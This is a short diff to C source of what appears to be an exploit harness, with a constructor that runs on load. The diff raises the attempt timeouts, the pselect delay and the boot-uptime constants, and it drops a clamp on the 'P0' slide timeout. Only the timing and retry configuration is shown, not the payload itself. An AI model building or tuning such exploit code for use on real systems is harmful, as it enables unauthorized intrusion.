@@ -7,14 +7,15 @@
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
 #endif
 #endif
-#define DEFAULT_PSELECT_DELAY_USEC 20000
+#define DEFAULT_PSELECT_DELAY_USEC 200000
 #ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 300
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 600
 #endif
 #ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 180
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 300
 #endif
-#define APP_MIN_BOOT_UPTIME_SEC 120
+#define APP_MIN_BOOT_UPTIME_SEC 220
+#define P0_ATTEMPT_TIMEOUT_SEC 300
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 struct app_p0_shared_state {
@@ -131,13 +132,11 @@ __attribute__((constructor)) static void load(void) {
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
-      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 150, 9000);
   int p0_attempt_timeout_sec = env_int(
-      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
+      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 150,
       attempt_timeout_sec);
-  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
-    p0_attempt_timeout_sec = attempt_timeout_sec;
-  }
+
   if (getenv("SLIDE_ONLY")) {
     max_attempts = 1;
   }
